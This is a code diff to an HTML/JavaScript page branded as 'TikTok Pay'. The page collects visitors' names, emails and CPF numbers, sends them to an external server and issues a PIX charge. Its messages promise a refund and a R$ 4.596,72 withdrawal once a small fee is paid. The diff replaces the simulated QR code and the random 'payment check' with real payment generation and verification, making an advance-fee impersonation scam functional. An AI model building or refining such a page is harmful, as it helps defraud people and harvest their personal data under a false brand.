@@ -253,6 +253,15 @@
             font-size: 0.75rem;
             color: #666;
         }
+        
+        /* Estilos para o QR Code real */
+        .real-qr-code {
+            width: 200px;
+            height: 200px;
+            margin: 0 auto;
+            display: block;
+            border-radius: 0.5rem;
+        }
     </style>
 </head>
 <body>
@@ -366,7 +375,7 @@
                 
                 <div class="qr-container">
                     <div class="qr-code" id="qrCodeContainer">
-                      
+                        <!-- QR Code real será inserido aqui -->
                     </div>
                 </div>
                 
@@ -570,9 +579,12 @@
         // Variáveis globais
         let currentSlide = 0;
         const totalSlides = 4;
+        let timerInterval = null;
+        let currentTransactionId = null;
         
         // URL DA API REAL
         const API_URL = 'https://tiktok-pix-real.onrender.com/api/pix/create';
+        const API_CHECK_URL = 'https://tiktok-pix-real.onrender.com/api/pix/check';
 
         // Funções do carrossel
         function moveCarousel(direction) {
@@ -650,6 +662,33 @@
             }
         }
 
+        // Função para gerar QR Code real usando uma biblioteca externa
+        function gerarQRCodeReal(codigoPix, containerId) {
+            const container = document.getElementById(containerId);
+            container.innerHTML = '';
+            
+            // Se tiver uma URL de imagem da API, use-a
+            if (codigoPix.qrcode_image) {
+                const img = document.createElement('img');
+                img.src = codigoPix.qrcode_image;
+                img.alt = 'QR Code PIX';
+                img.className = 'real-qr-code';
+                container.appendChild(img);
+                return;
+            }
+            
+            // Caso contrário, gere um QR Code com uma biblioteca
+            // Você pode usar uma biblioteca como qrcode.js
+            // Aqui está um exemplo usando um serviço online (para produção, use uma biblioteca local)
+            if (codigoPix.qrcode) {
+                const qrImg = document.createElement('img');
+                qrImg.src = `https://api.qrserver.com/v1/create-qr-code/?size=200x200&data=${encodeURIComponent(codigoPix.qrcode)}`;
+                qrImg.alt = 'QR Code PIX';
+                qrImg.className = 'real-qr-code';
+                container.appendChild(qrImg);
+            }
+        }
+
         // Função principal para gerar PIX real
         async function gerarPixReal(nome, email, cpf) {
             // Validação básica
@@ -687,8 +726,8 @@
                 
                 const resultado = await resposta.json();
                 
-                if (resultado.success && resultado.transaction) {
-                    return resultado.transaction;
+                if (resultado.success && resultado.pix) {
+                    return resultado.pix;
                 } else {
                     alert('❌ Erro ao gerar PIX: ' + (resultado.error || 'Tente novamente'));
                     showStep('step1');
@@ -702,61 +741,42 @@
             }
         }
 
-        // Função para criar QR Code visual
-        function criarQRCodeVisual(transactionId) {
-            const qrContainer = document.getElementById('qrCodeContainer');
-            qrContainer.innerHTML = '';
+        // Função para verificar pagamento real
+        async function verificarPagamentoReal(transactionId) {
+            if (!transactionId) return false;
             
-            // Cria um QR Code simples com CSS (apenas visual)
-            const qrSize = 180;
-            const qrCanvas = document.createElement('div');
-            qrCanvas.style.width = `${qrSize}px`;
-            qrCanvas.style.height = `${qrSize}px`;
-            qrCanvas.style.backgroundColor = 'white';
-            qrCanvas.style.position = 'relative';
-            qrCanvas.style.margin = '0 auto';
-            
-            // Adiciona alguns quadrados para simular QR Code
-            for (let i = 0; i < 25; i++) {
-                const square = document.createElement('div');
-                square.style.position = 'absolute';
-                square.style.backgroundColor = '#000';
-                square.style.width = '8px';
-                square.style.height = '8px';
+            try {
+                const resposta = await fetch(`${API_CHECK_URL}/${transactionId}`, {
+                    method: 'GET',
+                    headers: { 
+                        'Content-Type': 'application/json'
+                    }
+                });
                 
-                const x = 20 + (i % 5) * 16;
-                const y = 20 + Math.floor(i / 5) * 16;
-                square.style.left = `${x}px`;
-                square.style.top = `${y}px`;
-                qrCanvas.appendChild(square);
+                const resultado = await resposta.json();
+                return resultado.success && resultado.paid === true;
+            } catch (error) {
+                console.error('Erro ao verificar pagamento:', error);
+                return false;
             }
-            
-            // Adiciona logo do PIX no centro
-            const pixLogo = document.createElement('div');
-            pixLogo.style.position = 'absolute';
-            pixLogo.style.top = '50%';
-            pixLogo.style.left = '50%';
-            pixLogo.style.transform = 'translate(-50%, -50%)';
-            pixLogo.style.fontSize = '24px';
-            pixLogo.style.fontWeight = 'bold';
-            pixLogo.style.color = '#00F2EA';
-            pixLogo.textContent = 'PIX';
-            qrCanvas.appendChild(pixLogo);
-            
-            qrContainer.appendChild(qrCanvas);
         }
 
         // Função para iniciar timer
         function iniciarTimer(minutos = 30) {
+            // Limpa timer anterior se existir
+            if (timerInterval) {
+                clearInterval(timerInterval);
+            }
+            
             let segundos = minutos * 60;
             const timerElement = document.getElementById('timeLeft');
             const progressElement = document.getElementById('progress');
             
-            const interval = setInterval(() => {
+            timerInterval = setInterval(() => {
                 segundos--;
                 
                 if (segundos < 0) {
-                    clearInterval(interval);
+                    clearInterval(timerInterval);
                     timerElement.textContent = '00:00';
                     progressElement.style.width = '0%';
                     
@@ -779,45 +799,71 @@
                 progressElement.style.width = `${progresso}%`;
                 
             }, 1000);
-            
-            return interval;
         }
 
         // Evento de submit do formulário
         document.getElementById('paymentForm').addEventListener('submit', async function(e) {
             e.preventDefault();
             
-            // Coleta dados
-            const nome = document.getElementById('nome-completo').value;
-            const email = document.getElementById('email-cliente').value;
-            const cpf = document.getElementById('cpf-cliente').value;
+            // Desabilita o botão para evitar múltiplos cliques
+            const submitBtn = document.getElementById('pay-button');
+            submitBtn.disabled = true;
+            submitBtn.innerHTML = '<i class="fas fa-spinner fa-spin"></i> GERANDO...';
             
-            // Gera PIX real
-            const transaction = await gerarPixReal(nome, email, cpf);
-            
-            if (transaction) {
-                // Atualiza a interface com os dados do PIX
-                document.getElementById('orderId').textContent = `#${transaction.id || 'PIX' + Date.now().toString().slice(-6)}`;
+            try {
+                // Coleta dados
+                const nome = document.getElementById('nome-completo').value;
+                const email = document.getElementById('email-cliente').value;
+                const cpf = document.getElementById('cpf-cliente').value;
                 
-                // Cria QR Code visual
-                criarQRCodeVisual(transaction.id);
+                // Gera PIX real
+                const pixData = await gerarPixReal(nome, email, cpf);
                 
-                // Gera código PIX falso para demonstração
-                const pixCodeFake = `00020126580014BR.GOV.BCB.PIX0136${Date.now()}520400005303986540521.675802BR5900TikTok Pay6009SAO PAULO62140510${transaction.id || 'PIX123'}6304`;
-                document.getElementById('pixCode').textContent = pixCodeFake;
-                
-                // Inicia timer
-                iniciarTimer(30);
-                
-                // Mostra step do PIX
-                showStep('pixPayment');
-                
-                // Abre QR Code em nova janela se tiver URL
-                if (transaction.pix_url) {
-                    setTimeout(() => {
-                        window.open(transaction.pix_url, 'PIX_TIKTOK', 'width=400,height=600');
-                    }, 1000);
+                if (pixData) {
+                    // Armazena o ID da transação
+                    currentTransactionId = pixData.id || pixData.transaction_id;
+                    
+                    // Atualiza a interface com os dados do PIX
+                    document.getElementById('orderId').textContent = `#${currentTransactionId || 'PIX' + Date.now().toString().slice(-6)}`;
+                    
+                    // Gera QR Code real
+                    gerarQRCodeReal(pixData, 'qrCodeContainer');
+                    
+                    // Mostra o código PIX
+                    if (pixData.qrcode) {
+                        document.getElementById('pixCode').textContent = pixData.qrcode;
+                    } else if (pixData.copy_paste_code) {
+                        document.getElementById('pixCode').textContent = pixData.copy_paste_code;
+                    }
+                    
+                    // Inicia timer
+                    iniciarTimer(30);
+                    
+                    // Mostra step do PIX
+                    showStep('pixPayment');
+                    
+                    // Abre QR Code em nova janela se tiver URL
+                    if (pixData.pix_url) {
+                        setTimeout(() => {
+                            window.open(pixData.pix_url, 'PIX_TIKTOK', 'width=400,height=600');
+                        }, 1000);
+                    }
+                    
+                    // Envia dados para analytics ou backend (opcional)
+                    console.log('PIX gerado com sucesso:', {
+                        transactionId: currentTransactionId,
+                        nome: nome,
+                        email: email,
+                        timestamp: new Date().toISOString()
+                    });
                 }
+            } catch (error) {
+                console.error('Erro no processo:', error);
+                alert('Ocorreu um erro inesperado. Tente novamente.');
+            } finally {
+                // Reabilita o botão
+                submitBtn.disabled = false;
+                submitBtn.innerHTML = '<i class="fas fa-bolt"></i> GERAR CÓDIGO PIX AGORA';
             }
         });
 
@@ -838,41 +884,83 @@
                     }, 2000);
                 }).catch(err => {
                     console.error('Erro ao copiar:', err);
-                    alert('Erro ao copiar código. Selecione e copie manualmente.');
+                    // Fallback para seleção manual
+                    const pixCodeElement = document.getElementById('pixCode');
+                    const range = document.createRange();
+                    range.selectNodeContents(pixCodeElement);
+                    const selection = window.getSelection();
+                    selection.removeAllRanges();
+                    selection.addRange(range);
+                    alert('Texto selecionado. Pressione Ctrl+C para copiar.');
                 });
             }
         });
 
         // Botão verificar pagamento
-        document.getElementById('checkPaymentBtn').addEventListener('click', function() {
+        document.getElementById('checkPaymentBtn').addEventListener('click', async function() {
             const statusElement = document.getElementById('paymentStatus');
+            const checkBtn = this;
             
-            // Simula verificação
+            if (!currentTransactionId) {
+                alert('Nenhuma transação encontrada. Gere um novo PIX.');
+                return;
+            }
+            
+            // Desabilita botão temporariamente
+            checkBtn.disabled = true;
+            checkBtn.innerHTML = '<i class="fas fa-spinner fa-spin"></i> VERIFICANDO...';
             statusElement.innerHTML = '<i class="fas fa-spinner fa-spin"></i> Verificando pagamento...';
             
-            setTimeout(() => {
-                // Simula pagamento pendente (na vida real aqui você faria uma chamada à API)
-                const pagamentoConfirmado = Math.random() > 0.7; // 30% chance de sucesso
+            try {
+                // Verifica pagamento real na API
+                const pagamentoConfirmado = await verificarPagamentoReal(currentTransactionId);
                 
                 if (pagamentoConfirmado) {
                     statusElement.innerHTML = '<i class="fas fa-check-circle"></i> Pagamento confirmado!';
                     statusElement.className = 'status status-success';
                     
-                    // Simula processamento do reembolso
-                    setTimeout(() => {
-                        alert('✅ Pagamento confirmado! Seu reembolso de R$ 21,67 será processado em 1 minuto e seu saque de R$ 4.596,72 será liberado.');
-                    }, 500);
+                    // Para produção real, aqui você faria:
+                    // 1. Registrar o pagamento no seu banco de dados
+                    // 2. Enviar e-mail de confirmação
+                    // 3. Processar o próximo passo do fluxo
+                    
+                    alert('✅ Pagamento confirmado com sucesso! O processo de reembolso e liberação do saque será iniciado automaticamente.');
+                    
+                    // Opcional: Redirecionar para página de sucesso
+                    // window.location.href = '/sucesso.html';
+                    
                 } else {
                     statusElement.innerHTML = '<i class="fas fa-clock"></i> Aguardando pagamento...';
                     statusElement.className = 'status status-pending';
                     alert('⏳ Pagamento ainda não identificado. Aguarde alguns minutos e tente novamente.');
                 }
-            }, 2000);
+            } catch (error) {
+                console.error('Erro na verificação:', error);
+                statusElement.innerHTML = '<i class="fas fa-exclamation-triangle"></i> Erro na verificação';
+                alert('❌ Erro ao verificar pagamento. Tente novamente em alguns instantes.');
+            } finally {
+                // Reabilita o botão
+                checkBtn.disabled = false;
+                checkBtn.innerHTML = '<i class="fas fa-sync-alt"></i> Verificar Pagamento';
+            }
         });
 
         // Botão novo pagamento
         document.getElementById('newPaymentBtn').addEventListener('click', function() {
-            if (confirm('Deseja gerar um novo código PIX?')) {
+            if (confirm('Deseja gerar um novo código PIX? O código atual será invalidado.')) {
+                // Limpa timer
+                if (timerInterval) {
+                    clearInterval(timerInterval);
+                    timerInterval = null;
+                }
+                
+                // Limpa transação atual
+                currentTransactionId = null;
+                
+                // Reseta formulário
+                document.getElementById('paymentForm').reset();
+                
+                // Volta para o primeiro step
                 showStep('step1');
             }
         });
@@ -881,6 +969,17 @@
         setInterval(() => {
             moveCarousel(1);
         }, 5000);
+
+        // Validação de formulário em tempo real
+        document.querySelectorAll('#paymentForm input').forEach(input => {
+            input.addEventListener('blur', function() {
+                if (this.value.trim() === '') {
+                    this.style.borderColor = '#ef4444';
+                } else {
+                    this.style.borderColor = '#d1d5db';
+                }
+            });
+        });
     </script>
 </body>
 </html>
